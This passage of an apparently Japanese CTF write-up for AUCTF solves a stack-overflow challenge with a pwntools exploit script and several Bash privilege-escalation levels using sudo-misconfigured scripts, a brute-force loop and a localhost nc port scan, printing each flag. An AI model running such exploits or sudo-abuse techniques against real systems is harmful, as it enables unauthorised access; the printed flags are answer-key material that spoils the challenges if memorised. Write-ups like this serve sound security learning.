+<pre class="chroma"><code class="language-C" data-lang="C"><span class="n">undefined4</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">undefined</span> <span class="o">*</span><span class="n">puVar1</span><span class="p">;</span>
+  
+  <span class="n">puVar1</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">stack0x00000004</span><span class="p">;</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Hi!</span><span class="se">\n</span><span class="s">Welcome to my program... it</span><span class="se">\&#39;</span><span class="s">s a little buggy...&#34;</span><span class="p">);</span>
+  <span class="n">vulnerable</span><span class="p">(</span><span class="n">puVar1</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">vulnerable</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">local_30</span> <span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">local_20</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_1c</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_18</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_14</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Hey I heard you are searching for flags! Well I</span><span class="se">\&#39;</span><span class="s">ve got one. :)&#34;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Here you can have part of it!&#34;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;auctf{&#34;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Sorry that</span><span class="se">\&#39;</span><span class="s">s all I got!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="n">local_10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_14</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
+  <span class="n">local_18</span> <span class="o">=</span> <span class="mh">0x14</span><span class="p">;</span>
+  <span class="n">local_1c</span> <span class="o">=</span> <span class="mh">0x14</span><span class="p">;</span>
+  <span class="n">local_20</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">local_30</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">((((</span><span class="n">local_10</span> <span class="o">==</span> <span class="mh">0x1337</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">&lt;</span> <span class="o">-</span><span class="mh">0x14</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_1c</span> <span class="o">!=</span> <span class="mh">0x14</span><span class="p">))</span> <span class="o">&amp;&amp;</span>
+     <span class="p">((</span><span class="n">local_18</span> <span class="o">==</span> <span class="mh">0x667463</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_20</span> <span class="o">==</span> <span class="mh">0x2a</span><span class="p">))))</span> <span class="p">{</span>
+    <span class="n">print_flag</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br>
+fgets()の箇所でlocal_30に入力ができますが、バッファのサイズ16バイトにも関わらず、36バイト（0x24）読み込むようになっています。</p>
+
+<p>ここで、その他のローカル変数を任意の値に書き換えられます。</p>
+
+<p>if文の条件に合うように値をセットしたら、print_flag()でフラグが表示されます。</p>
+
+<p><br>
+<code>(local_14 &lt; -0x14)</code> の判定が少しわかりにくいですが、ここはアセンブラで見た方がわかりやすいかもです。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C">   <span class="mh">0x565562df</span> <span class="o">&lt;+</span><span class="mi">143</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x56556040</span> <span class="o">&lt;</span><span class="n">fgets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+   <span class="mh">0x565562e4</span> <span class="o">&lt;+</span><span class="mi">148</span><span class="o">&gt;:</span>	<span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
+   <span class="mh">0x565562e7</span> <span class="o">&lt;+</span><span class="mi">151</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0x1337</span>
+   <span class="mh">0x565562ee</span> <span class="o">&lt;+</span><span class="mi">158</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x56556310</span> <span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;</span>
+<span class="o">=&gt;</span> <span class="mh">0x565562f0</span> <span class="o">&lt;+</span><span class="mi">160</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x10</span><span class="p">],</span><span class="mh">0xffffffec</span>
+   <span class="mh">0x565562f4</span> <span class="o">&lt;+</span><span class="mi">164</span><span class="o">&gt;:</span>	<span class="n">jge</span>    <span class="mh">0x56556310</span> <span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;</span>
+   <span class="mh">0x565562f6</span> <span class="o">&lt;+</span><span class="mi">166</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x18</span><span class="p">],</span><span class="mh">0x14</span>
+   <span class="mh">0x565562fa</span> <span class="o">&lt;+</span><span class="mi">170</span><span class="o">&gt;:</span>	<span class="n">je</span>     <span class="mh">0x56556310</span> <span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;</span>
+   <span class="mh">0x565562fc</span> <span class="o">&lt;+</span><span class="mi">172</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x14</span><span class="p">],</span><span class="mh">0x667463</span>
+   <span class="mh">0x56556303</span> <span class="o">&lt;+</span><span class="mi">179</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x56556310</span> <span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;</span>
+   <span class="mh">0x56556305</span> <span class="o">&lt;+</span><span class="mi">181</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x1c</span><span class="p">],</span><span class="mh">0x2a</span>
+   <span class="mh">0x56556309</span> <span class="o">&lt;+</span><span class="mi">185</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x56556310</span> <span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;</span>
+   <span class="mh">0x5655630b</span> <span class="o">&lt;+</span><span class="mi">187</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x56556360</span> <span class="o">&lt;</span><span class="n">print_flag</span><span class="o">&gt;</span>
+   <span class="mh">0x56556310</span> <span class="o">&lt;+</span><span class="mi">192</span><span class="o">&gt;:</span>	<span class="n">nop</span>
+   <span class="mh">0x56556311</span> <span class="o">&lt;+</span><span class="mi">193</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
+   <span class="mh">0x56556314</span> <span class="o">&lt;+</span><span class="mi">196</span><span class="o">&gt;:</span>	<span class="n">leave</span>  
+   <span class="mh">0x56556315</span> <span class="o">&lt;+</span><span class="mi">197</span><span class="o">&gt;:</span>	<span class="n">ret</span>   </code></pre></td></tr></table>
+</div>
+</div>
+<p><br>
+<code>0xffffffec</code> との比較をしているので、<code>0xffffffeb</code> か <code>0xffffffed</code> のどちらかで行けるでしょう（笑）</p>
+
+<p>（<code>0xffffffeb</code> が正解でした。)</p>
+
+<p><br>
+ということで、書いたコードです。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">if</span> <span class="mi">0</span><span class="p">:</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./turkey&#39;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;challenges.auctf.com&#39;</span><span class="p">,</span> <span class="mi">30011</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">16</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0000002a</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00000015</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00667463</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xffffffeb</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00001337</span><span class="p">)</span>
+
+<span class="c1"># s.sendlineafter(&#34;all I got!\n\n&#34;, payload)</span>
+<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;all I got!</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br></p>
+
+<p>Flag: <code>auctf{I_s@id_1_w@s_fu11!}</code></p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<h2 id="bash-bash-2">[Bash]: Bash 2</h2>
+
+<hr />
+
+<h3 id="challenge-7">Challenge</h3>
+
+<blockquote>
+<p>ssh challenges.auctf.com -p 30040 -l level2
+<br /><br />
+password is the flag of the previous Bash challenge</p>
+</blockquote>
+
+<p><br /></p>
+
+<h3 id="solution-7">Solution</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">$ ls -la
+total 28
+dr-xr-x--x 1 level2 level2 4096 Apr  3 16:00 .
+drwxr-xr-x 1 root   root   4096 Apr  3 15:35 ..
+-rw-r--r-- 1 level2 level2  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 level2 level2 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 level2 level2  807 Apr  4  2018 .profile
+-r--r----- 1 level3 level3   22 Apr  1 21:25 flag.txt
+-r-xr-x--- 1 level3 level2  110 Apr  1 21:25 random_dirs.sh
+
+
+$ sudo -l
+Matching Defaults entries for level2 on a522debb8813:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User level2 may run the following commands on a522debb8813:
+    (level3) NOPASSWD: /home/level2/random_dirs.sh</pre></td></tr></table>
+</div>
+</div>
+<p><br />
+（random_dirs.sh の中身は、保存するのをすっかり忘れてました。。。）</p>
+
+<p>flag.txtの値を読み込んで、base64エンコードして、/tmpに下にファイルとして保存、そしてrmで削除する、みたいなやつでした。</p>
+
+<p><br />
+みんなが同じマシンで作業してたので、ゴミファイルとかも結構あったし、結果として/tmpの下をモニターしているだけでフラグが取れちゃいました。</p>
+
+<pre>
+$ cd /tmp
+$ find . -type f | xargs cat | grep -v try
+YXVjdGZ7ZzB0dEBfbXV2X2Zhczd9Cg==
+:
+:
+</pre>
+
+<p>（<code>grep -v try</code> は、他の人が作ったゴミをフィルターするだけのものです。）</p>
+
+<p><br />
+<pre>
+$ echo &quot;YXVjdGZ7ZzB0dEBfbXV2X2Zhczd9Cg==&quot; | base64 -d
+auctf{g0tt@_muv_fas7}
+</pre></p>
+
+<p><br /></p>
+
+<p>Flag: <code>auctf{g0tt@_muv_fas7}</code></p>
+
+<p>＃なにかを速く移動 (move fast) させないといけなかったのかな？</p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<h2 id="bash-bash-3">[Bash]: Bash 3</h2>
+
+<hr />
+
+<h3 id="challenge-8">Challenge</h3>
+
+<blockquote>
+<p>ssh challenges.auctf.com -p 30040 -l level3
+<br /><br />
+password is the flag of the previous Bash challenge</p>
+</blockquote>
+
+<p><br /></p>
+
+<h3 id="solution-8">Solution</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">$ ls -la
+total <span class="m">28</span>
+dr-xr-x--x <span class="m">1</span> level3 level3 <span class="m">4096</span> Apr  <span class="m">3</span> <span class="m">16</span>:00 .
+drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> <span class="m">15</span>:35 ..
+-rw-r--r-- <span class="m">1</span> level3 level3  <span class="m">220</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bash_logout
+-rw-r--r-- <span class="m">1</span> level3 level3 <span class="m">3771</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bashrc
+-rw-r--r-- <span class="m">1</span> level3 level3  <span class="m">807</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .profile
+-r--r----- <span class="m">1</span> level4 level4   <span class="m">30</span> Apr  <span class="m">1</span> <span class="m">21</span>:25 flag.txt
+-r-xr-x--- <span class="m">1</span> level4 level3  <span class="m">179</span> Apr  <span class="m">1</span> <span class="m">21</span>:25 passcodes.sh
+
+
+$ cat passcodes.sh
+<span class="c1">#!/bin/bash</span>
+
+<span class="nv">x</span><span class="o">=</span><span class="nv">$RANDOM</span>
+<span class="nb">echo</span> <span class="s2">&#34;Input the random number.&#34;</span>
+<span class="nb">read</span> input
+
+<span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$input</span><span class="s2">&#34;</span> -eq <span class="s2">&#34;</span><span class="nv">$x</span><span class="s2">&#34;</span> <span class="o">]]</span>
+<span class="k">then</span>
+	<span class="nb">echo</span> <span class="s2">&#34;AWESOME sauce&#34;</span>
+	cat flag.txt
+<span class="k">else</span>
+	<span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$input</span><span class="s2">&#34;</span>
+	<span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$x</span><span class="s2"> try again&#34;</span>
+<span class="k">fi</span>
+
+
+$ sudo -l
+Matching Defaults entries <span class="k">for</span> level3 on a95be49047ca:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User level3 may run the following commands on a95be49047ca:
+    <span class="o">(</span>level4<span class="o">)</span> NOPASSWD: /home/level3/passcodes.sh</pre></td></tr></table>
+</div>
+</div>
+<p><br />
+（ちなみに、初日は <code>sudo -u level4 /home/level3/passcodes.sh</code> の実行にパスワードが要求されて、2日目には直っていました。）</p>
+
+<p><br />
+どれか1つ決め打ちで無限ループしたら、そのうち当たるだろう、というやり方です。
+<pre>
+$ while true ; do echo 1 | sudo -u level4 /home/level3/passcodes.sh; done | grep -i auctf
+auctf{wut_r_d33z_RaNdom_numz}
+</pre></p>
+
+<p><br /></p>
+
+<p>Flag: <code>auctf{wut_r_d33z_RaNdom_numz}</code></p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<h2 id="bash-bash-4">[Bash]: Bash 4</h2>
+
+<hr />
+
+<h3 id="challenge-9">Challenge</h3>
+
+<blockquote>
+<p>ssh challenges.auctf.com -p 30040 -l level4</p>
+</blockquote>
+
+<p><br /></p>
+
+<h3 id="solution-9">Solution</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">$ ls -la
+total <span class="m">32</span>
+dr-xr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">4</span> <span class="m">21</span>:54 .
+drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> <span class="m">15</span>:35 ..
+-rw-r--r-- <span class="m">1</span> level4 level4  <span class="m">220</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bash_logout
+-rw-r--r-- <span class="m">1</span> level4 level4 <span class="m">3771</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bashrc
+-rw-r--r-- <span class="m">1</span> level4 level4  <span class="m">807</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .profile
+-r--r----- <span class="m">1</span> level5 level5   <span class="m">25</span> Apr  <span class="m">1</span> <span class="m">21</span>:25 flag.txt
+-r-xr-x--- <span class="m">1</span> level5 level4  <span class="m">209</span> Apr  <span class="m">1</span> <span class="m">21</span>:25 print_file.sh
+
+
+$ cat print_file.sh
+<span class="c1">#!/bin/bash</span>
+
+<span class="k">if</span> <span class="o">[</span> ! -z <span class="s2">&#34;</span><span class="nv">$@</span><span class="s2">&#34;</span> <span class="o">]</span>
+<span class="k">then</span>
+	cat <span class="nv">$@</span> <span class="c1"># 2&gt;/dev/null</span>
+	<span class="c1"># if [ ! $? -eq 0 ]</span>
+	<span class="c1"># then</span>
+	<span class="c1"># 	echo &#34;Printing error. Check file permissions&#34;</span>
+	<span class="c1"># fi</span>
+<span class="k">else</span>
+	<span class="nb">echo</span> <span class="s2">&#34;Please enter a file.&#34;</span>
+	<span class="nb">echo</span> <span class="s2">&#34;./print_file FILENAME&#34;</span>
+<span class="k">fi</span>
+
+
+$ sudo -l
+Matching Defaults entries <span class="k">for</span> level4 on 7fe0b0d86907:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User level4 may run the following commands on 7fe0b0d86907:
+    <span class="o">(</span>level5<span class="o">)</span> NOPASSWD: /home/level4/print_file.sh</pre></td></tr></table>
+</div>
+</div>
+<p><br /></p>
+
+<pre>
+$ sudo -u level5 /home/level4/print_file.sh flag.txt
+auctf{FunKy_P3rm1ssi0nZ}
+</pre>
+
+<p><br /></p>
+
+<p>Flag: <code>auctf{FunKy_P3rm1ssi0nZ}</code></p>
+
+<p>＃ここにきて、何がFunkyなのか意味がわからなかったです。</p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<h2 id="bash-bash-5">[Bash]: Bash 5</h2>
+
+<hr />
+
+<h3 id="challenge-10">Challenge</h3>
+
+<blockquote>
+<p>ssh challenges.auctf.com -p 30040 -l level5</p>
+</blockquote>
+
+<p><br /></p>
+
+<h3 id="solution-10">Solution</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">$ ls -la
+total <span class="m">36</span>
+dr-xr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">4</span> <span class="m">21</span>:54 .
+drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> <span class="m">15</span>:35 ..
+-rw-r--r-- <span class="m">1</span> level5 level5  <span class="m">220</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bash_logout
+-rw-r--r-- <span class="m">1</span> level5 level5 <span class="m">3777</span> Apr  <span class="m">4</span> <span class="m">22</span>:03 .bashrc
+-rw-r--r-- <span class="m">1</span> level5 level5  <span class="m">807</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .profile
+-r--r----- <span class="m">1</span> root   root     <span class="m">23</span> Apr  <span class="m">1</span> <span class="m">21</span>:25 flag.txt
+-r-xr-x--- <span class="m">1</span> root   level5  <span class="m">137</span> Apr  <span class="m">1</span> <span class="m">21</span>:25 portforce.sh
+
+
+$ cat portforce.sh
+<span class="c1">#!/bin/bash</span>
+
+<span class="nv">x</span><span class="o">=</span><span class="k">$(</span>shuf -i <span class="m">1024</span>-65500 -n <span class="m">1</span><span class="k">)</span>
+<span class="nb">echo</span> <span class="s2">&#34;Guess the listening port&#34;</span>
+<span class="nv">input</span><span class="o">=</span><span class="k">$(</span>nc -lp <span class="nv">$x</span><span class="k">)</span>
+<span class="nb">echo</span> <span class="s2">&#34;That was easy right? :)&#34;</span>
+cat flag.txt
+
+
+$ sudo -l
+Matching Defaults entries <span class="k">for</span> level5 on 7fe0b0d86907:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User level5 may run the following commands on 7fe0b0d86907:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /home/level5/portforce.sh</pre></td></tr></table>
+</div>
+</div>
+<p><br />
+これはローカルで試したら、よくわかりやすかったです。</p>
+
+<p>以下のようなファイルを用意。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="cp">#!/bin/bash
+</span><span class="cp"></span>
+<span class="nv">x</span><span class="o">=</span><span class="k">$(</span>shuf -i <span class="m">1024</span>-65500 -n <span class="m">1</span><span class="k">)</span>
+<span class="nb">echo</span> <span class="s2">&#34;Guess the listening port&#34;</span>
+<span class="nb">echo</span> <span class="nv">$x</span>   <span class="c1"># &lt;&lt;&lt;&lt; これを追加</span>
+<span class="nv">input</span><span class="o">=</span><span class="k">$(</span>nc -lp <span class="nv">$x</span><span class="k">)</span>
+<span class="nb">echo</span> <span class="s2">&#34;That was easy right? :)&#34;</span>
+cat flag.txt</code></pre></td></tr></table>
+</div>
+</div>
+<p><br />
+これで実行すると、どのポートでncがlistenしているかわかるので、（ま、netstatでもよかったけど）</p>
+
+<p>そのポートに対して、<code>echo test | nc localhost &lt;port&gt;</code> みたいにしてやると、以降の処理が実行されてフラグが表示されました。</p>
+
+<p>ちなみに、ローカルでテストする場合は、rootじゃなくても、自分自身でテストはできました。</p>
+
+<p><br />
+ということで、チャレンジサーバ上で、<code>sudo /home/level5/portforce.sh</code>を実行して待受けしつつ、別のターミナルにて、</p>
+
+<pre>
+$ for i in {1024..65500} ; do (echo test | nc localhost ${i}) ; done
+invalid port {1024..65500} : No such file or directory
+
+$ /bin/bash
+$ for i in {1024..65500} ; do (echo test | nc localhost ${i}) ; done
+</pre>
+
+<p><br /></p>
+
+<p>Flag: <code>auctf{n3tc@_purt_$can}</code></p>
+
+<p>＃Discordで、「Random portがたまたま2回目で当たった」    と喜んでいる人がいました。たぶん、それはポート番号が当たったんじゃなくて、他の人がncを実行してくれたんだと思います。それはそれでラッキーでしたね^^</p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<hr />
+
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
